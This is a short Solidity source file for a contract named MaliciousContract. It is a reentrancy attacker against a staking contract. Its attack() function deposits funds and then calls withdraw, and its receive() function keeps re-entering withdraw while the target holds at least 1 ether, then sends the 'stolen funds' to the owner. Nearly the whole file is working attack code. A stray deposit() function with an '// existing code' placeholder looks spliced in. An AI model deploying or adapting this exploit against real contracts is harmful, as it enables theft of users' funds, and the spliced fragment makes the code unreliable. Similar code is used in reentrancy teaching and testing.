// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.24;

interface IStakingContract {
    function deposit() external payable;
    function withdraw() external;
}

contract MaliciousContract {
    IStakingContract public stakingContract;
    address public owner;
    uint256 public constant MIN_DEPOSIT = 0.1 ether;
    uint256 public constant MAX_DEPOSIT = 10 ether;

    constructor(address _stakingContract) {
        stakingContract = IStakingContract(_stakingContract);
        owner = msg.sender;
    }

    
        function deposit() public payable {

    require(msg.value >= MIN_DEPOSIT, "Deposit amount below minimum limit");

    require(msg.value <= MAX_DEPOSIT, "Deposit amount exceeds maximum limit");



    // existing code

}


    function attack() external payable {
        // Deposit funds into the staking contract
        stakingContract.deposit{value: msg.value}();
        // Attempt to re-enter the withdraw function
        stakingContract.withdraw();
    }

    receive() external payable {
        if (address(stakingContract).balance >= 1 ether) {
            stakingContract.withdraw();
        } else {
            // Transfer stolen funds to the attacker
            payable(owner).transfer(address(this).balance);
        }
    }


}